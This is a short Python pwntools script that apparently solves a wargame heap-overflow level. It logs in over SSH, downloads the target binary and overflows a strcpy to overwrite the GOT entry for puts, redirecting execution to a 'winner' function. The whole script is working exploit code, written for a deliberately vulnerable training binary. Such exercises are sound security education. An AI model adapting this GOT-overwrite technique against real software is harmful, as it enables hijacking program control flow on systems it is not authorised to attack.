from pwn import *
import os.path as op

s = ssh(host=args.HOST, user=args.USER, password=args.PASS, port=int(args.SSH_PORT))

lbin = op.join('/tmp', op.basename(args.BIN))
s.download_file(args.BIN, lbin)
e = ELF(lbin)
winner_addr = e.symbols['winner']
gotputs_addr = e.symbols['got.puts']
log.info('winner_addr:  %08x', winner_addr)
log.info('gotputs_addr: %08x', gotputs_addr)

# redirect got.puts() to winner()
b_data_off = 8 + 8 + 4  # distance from offset 0 of data(a) to offset 0 of b->data
data_a = fit({b_data_off: p32(gotputs_addr)})  # override b->data during strcpy(a->data, av[1])
data_b = p32(winner_addr)  # strcpy(b->data, av[2]) will copy that at the overrided address

with s.system([args.BIN, data_a, data_b]) as p:
    ret = p.recvline()
    assert ret.startswith('and we have a winner @ ')
